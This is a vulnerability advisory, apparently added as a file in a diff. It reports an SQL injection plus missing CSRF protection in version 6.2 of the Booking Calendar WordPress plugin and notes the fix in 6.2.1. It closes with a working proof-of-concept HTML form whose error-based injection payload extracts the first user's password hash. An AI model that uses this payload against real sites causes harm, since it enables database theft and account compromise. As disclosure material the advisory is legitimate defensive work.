@@ -1,0 +1,45 @@
+SQL injection vulnerability in Booking Calendar WordPress Plugin
+
+Abstract
+
+An SQL injection vulnerability exists in the Booking Calendar WordPress plugin. This vulnerability allows an attacker to view data from the database. The affected parameter is not properly sanitized or protected with an anti-Cross-Site Request Forgery token. Consequently, it can (also be exploited by luring the target user into clicking a specially crafted link or visiting a malicious website (or advertisement).
+
+Contact
+
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+OVE-20160714-0002
+
+Tested versions
+
+These issues were successfully tested on Booking Calendar WordPress Plugin version 6.2.
+
+Fix
+
+This issue is resolved in Booking Calendar version 6.2.1.
+
+Introduction
+
+The Booking Calendar WordPress Plugin is a booking system for online reservation and availability checking service for your site. An SQL injection vulnerability exists in the Booking Calendar WordPress plugin. This vulnerability allows an attacker to view data from the database. The affected parameter is not properly sanitized or protected with an anti-Cross-Site Request Forgery token. Consequently, it can (also be exploited by luring the target user into clicking a specially crafted link or visiting a malicious website (or advertisement).
+
+Details
+
+This was discovered by the using the filter by Booking ID field. Because a WordPress user with the 'Editor' role can also use the Booking plugin, Editors can also access the vulnerable parameter. This allows these users to view all data from the database. The vulnerability exists in the wpdev_get_args_from_request_in_bk_listing() function from booking/lib/wpdev-bk-lib.php (line 709).
+
+Proof of concept
+
+The following proof of concept will show the hashed password from the first user.
+
+<html>
+   <body>
+      <form action="http://<target>/wp-admin/admin.php?page=booking%2Fwpdev-booking.phpwpdev-booking&wh_approved&wh_is_new=1&wh_booking_date=3&view_mode=vm_listing" method="POST">
+         <input type="hidden" name="wh&#95;booking&#95;id" value="3 AND (SELECT 5283 FROM(SELECT COUNT(*),CONCAT(0x7176626271,(SELECT MID((IFNULL(CAST(user_pass AS CHAR),0x20)),1,54) FROM wordpress.wp_users ORDER BY ID LIMIT 0,1),0x717a787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)" />
+         <input type="submit" value="Submit request" />
+      </form>
+   </body>
+</html>
